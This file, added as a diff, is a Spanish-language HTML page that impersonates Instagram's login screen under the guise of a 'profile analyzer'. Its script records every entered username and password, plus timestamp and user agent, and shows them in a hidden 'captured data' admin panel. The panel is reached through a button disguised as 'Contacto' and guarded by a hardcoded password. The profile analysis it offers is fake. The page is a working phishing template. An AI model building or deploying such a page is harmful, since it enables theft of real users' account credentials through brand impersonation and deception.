@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Profile Analyzer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            max-width: 1000px;
+            width: 100%;
+            min-height: 600px;
+        }
+
+        .left-section {
+            flex: 1;
+            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .phone-mockup {
+            position: relative;
+            width: 300px;
+            height: 400px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255,255,255,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: rotate(-5deg);
+        }
+
+        .stories-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .story {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .story:nth-child(2) { animation-delay: 0.5s; }
+        .story:nth-child(3) { animation-delay: 1s; }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .right-section {
+            flex: 1;
+            padding: 60px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .logo {
+            font-family: 'Lobster', cursive;
+            font-size: 48px;
+            text-align: center;
+            margin-bottom: 40px;
+            background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #833ab4;
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(131, 58, 180, 0.2);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #833ab4, #fd1d1d);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(131, 58, 180, 0.3);
+        }
+
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e1e5e9;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 20px;
+        }
+
+        .facebook-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 15px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .facebook-btn:hover {
+            background: #166fe5;
+            transform: translateY(-2px);
+        }
+
+        .forgot-password {
+            text-align: center;
+            color: #00376b;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .register-link {
+            text-align: center;
+            color: #8e8e8e;
+        }
+
+        .register-link a {
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Admin Panel Styles */
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+        }
+
+        .admin-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 600px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+
+        .close-btn {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .data-entry {
+            background: #f8f9fa;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border-left: 4px solid #833ab4;
+        }
+
+        .timestamp {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .user-data {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .admin-toggle {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 12px 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: normal;
+            font-size: 14px;
+            box-shadow: 0 3px 10px rgba(108, 117, 125, 0.3);
+            z-index: 999;
+            opacity: 0.8;
+            transition: all 0.3s ease;
+        }
+
+        .admin-toggle:hover {
+            opacity: 1;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
+        }
+
+        /* Dashboard Styles */
+        .dashboard {
+            display: none;
+            padding: 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+
+        .dashboard-header {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .analysis-section {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+
+        .profile-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .analyze-btn {
+            background: linear-gradient(45deg, #833ab4, #fd1d1d);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .logout-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .left-section {
+                min-height: 200px;
+            }
+            
+            .phone-mockup {
+                width: 200px;
+                height: 250px;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Login Interface -->
+    <div class="container" id="loginContainer">
+        <div class="left-section">
+            <div class="phone-mockup">
+                <div class="stories-container">
+                    <div class="story">📸</div>
+                    <div class="story">❤️</div>
+                    <div class="story">✨</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="right-section">
+            <h1 class="logo">Instagram</h1>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" class="form-input" placeholder="Teléfono, usuario o correo electrónico" id="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-input" placeholder="Contraseña" id="password" required>
+                </div>
+                
+                <button type="submit" class="login-btn">Iniciar sesión</button>
+            </form>
+            
+            <div class="divider">
+                <span>O</span>
+            </div>
+            
+            <button class="facebook-btn" onclick="loginWithFacebook()">
+                <span>📘</span>
+                Iniciar sesión con Facebook
+            </button>
+            
+            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            
+            <div class="register-link">
+                ¿No tienes una cuenta? <a href="#" onclick="showRegister()">Regístrate</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div class="dashboard" id="dashboard">
+        <button class="logout-btn" onclick="logout()">Cerrar Sesión</button>
+        
+        <div class="dashboard-header">
+            <h1>🔍 Instagram Profile Analyzer</h1>
+            <p>Analiza cualquier perfil de Instagram y obtén insights detallados</p>
+        </div>
+        
+        <div class="analysis-section">
+            <h2>Analizar Perfil</h2>
+            <input type="text" class="profile-input" placeholder="Ingresa el nombre de usuario (ej: @username)" id="profileInput">
+            <button class="analyze-btn" onclick="analyzeProfile()">Analizar Perfil</button>
+            
+            <div id="analysisResults" style="margin-top: 20px;"></div>
+        </div>
+    </div>
+
+    <!-- Admin Login Modal -->
+    <div class="admin-panel" id="adminLogin" style="display: none;">
+        <div class="admin-content" style="max-width: 400px;">
+            <div class="admin-header">
+                <h2>🔐 Acceso Restringido</h2>
+                <button class="close-btn" onclick="closeAdminLogin()">Cerrar</button>
+            </div>
+            <form id="adminLoginForm">
+                <div class="form-group">
+                    <input type="password" class="form-input" placeholder="Ingresa la contraseña de administrador" id="adminPassword" required>
+                </div>
+                <button type="submit" class="login-btn">Acceder</button>
+            </form>
+            <div id="adminError" style="color: #ff4757; text-align: center; margin-top: 10px; display: none;">
+                ❌ Contraseña incorrecta
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-content">
+            <div class="admin-header">
+                <h2>📊 Panel de Administración - Datos Capturados</h2>
+                <button class="close-btn" onclick="closeAdmin()">Cerrar</button>
+            </div>
+            <div id="capturedData">
+                <p style="color: #666; text-align: center;">No hay datos capturados aún...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Toggle Button (Disguised) -->
+    <button class="admin-toggle" onclick="openAdmin()">📞 Contacto</button>
+
+    <script>
+        // Variables globales para almacenar datos
+        let capturedCredentials = [];
+        let currentUser = null;
+
+        // Función para capturar y mostrar datos del login
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const timestamp = new Date().toLocaleString('es-ES');
+            
+            // Guardar datos capturados
+            const loginData = {
+                username: username,
+                password: password,
+                timestamp: timestamp,
+                userAgent: navigator.userAgent,
+                ip: 'Simulado: 192.168.1.100' // En un entorno real, esto vendría del servidor
+            };
+            
+            capturedCredentials.push(loginData);
+            currentUser = username;
+            
+            // Simular login exitoso
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            
+            // Mostrar alerta de éxito
+            alert('¡Login exitoso! Bienvenido al analizador de perfiles.');
+        });
+
+        // Función para mostrar el panel de administración (ahora con contraseña)
+        function openAdmin() {
+            document.getElementById('adminLogin').style.display = 'block';
+        }
+
+        // Función para cerrar el login de admin
+        function closeAdminLogin() {
+            document.getElementById('adminLogin').style.display = 'none';
+            document.getElementById('adminPassword').value = '';
+            document.getElementById('adminError').style.display = 'none';
+        }
+
+        // Función para verificar contraseña de admin
+        document.getElementById('adminLoginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const password = document.getElementById('adminPassword').value;
+            const correctPassword = 'caplatense27';
+            
+            if (password === correctPassword) {
+                // Contraseña correcta - mostrar panel de datos
+                document.getElementById('adminLogin').style.display = 'none';
+                showAdminPanel();
+            } else {
+                // Contraseña incorrecta - mostrar error
+                document.getElementById('adminError').style.display = 'block';
+                document.getElementById('adminPassword').value = '';
+                
+                // Ocultar error después de 3 segundos
+                setTimeout(() => {
+                    document.getElementById('adminError').style.display = 'none';
+                }, 3000);
+            }
+        });
+
+        // Función para mostrar el panel de datos (separada del login)
+        function showAdminPanel() {
+            const adminPanel = document.getElementById('adminPanel');
+            const dataContainer = document.getElementById('capturedData');
+            
+            if (capturedCredentials.length === 0) {
+                dataContainer.innerHTML = '<p style="color: #666; text-align: center;">No hay datos capturados aún...</p>';
+            } else {
+                let html = '';
+                capturedCredentials.forEach((data, index) => {
+                    html += `
+                        <div class="data-entry">
+                            <div class="timestamp">📅 ${data.timestamp}</div>
+                            <div class="user-data">
+                                <strong>👤 Usuario:</strong> ${data.username}<br>
+                                <strong>🔐 Contraseña:</strong> ${data.password}<br>
+                                <strong>🌐 User Agent:</strong> ${data.userAgent.substring(0, 50)}...<br>
+                                <strong>📍 IP:</strong> ${data.ip}
+                            </div>
+                        </div>
+                    `;
+                });
+                dataContainer.innerHTML = html;
+            }
+            
+            adminPanel.style.display = 'block';
+        }
+
+        // Función para cerrar el panel de administración
+        function closeAdmin() {
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+
+        // Función para logout
+        function logout() {
+            currentUser = null;
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('loginContainer').style.display = 'flex';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        // Función para login con Facebook (simulado)
+        function loginWithFacebook() {
+            const timestamp = new Date().toLocaleString('es-ES');
+            const loginData = {
+                username: 'usuario_facebook@email.com',
+                password: '[Facebook OAuth Token]',
+                timestamp: timestamp,
+                userAgent: navigator.userAgent,
+                ip: 'Simulado: 192.168.1.100',
+                method: 'Facebook'
+            };
+            
+            capturedCredentials.push(loginData);
+            currentUser = 'Usuario Facebook';
+            
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            
+            alert('¡Login con Facebook exitoso!');
+        }
+
+        // Función para mostrar registro (simulado)
+        function showRegister() {
+            alert('Funcionalidad de registro - Aquí capturarías más datos del usuario');
+        }
+
+        // Función para analizar perfil (simulado)
+        function analyzeProfile() {
+            const profileInput = document.getElementById('profileInput');
+            const resultsDiv = document.getElementById('analysisResults');
+            
+            if (!profileInput.value.trim()) {
+                alert('Por favor ingresa un nombre de usuario');
+                return;
+            }
+            
+            // Simular análisis
+            resultsDiv.innerHTML = `
+                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-top: 20px;">
+                    <h3>📊 Análisis de ${profileInput.value}</h3>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
+                        <div style="background: white; padding: 15px; border-radius: 8px; text-align: center;">
+                            <h4>👥 Seguidores</h4>
+                            <p style="font-size: 24px; font-weight: bold; color: #833ab4;">12.5K</p>
+                        </div>
+                        <div style="background: white; padding: 15px; border-radius: 8px; text-align: center;">
+                            <h4>📱 Siguiendo</h4>
+                            <p style="font-size: 24px; font-weight: bold; color: #833ab4;">1.2K</p>
+                        </div>
+                        <div style="background: white; padding: 15px; border-radius: 8px; text-align: center;">
+                            <h4>📸 Posts</h4>
+                            <p style="font-size: 24px; font-weight: bold; color: #833ab4;">248</p>
+                        </div>
+                        <div style="background: white; padding: 15px; border-radius: 8px; text-align: center;">
+                            <h4>💝 Engagement</h4>
+                            <p style="font-size: 24px; font-weight: bold; color: #833ab4;">3.2%</p>
+                        </div>
+                    </div>
+                    <p style="margin-top: 15px; color: #666; font-style: italic;">
+                        ⚠️ Nota: Este es un análisis simulado para demostración
+                    </p>
+                </div>
+            `;
+        }
+
+        // Función para mostrar datos en consola (para debugging)
+        function showCapturedData() {
+            console.log('=== DATOS CAPTURADOS ===');
+            console.table(capturedCredentials);
+        }
+
+        // Atajos de teclado para admin (Ctrl+Shift+C para "Contacto")
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+                e.preventDefault();
+                openAdmin(); // Esto ahora abre el login primero
+            }
+        });
+    </script>
+</body>
+</html>
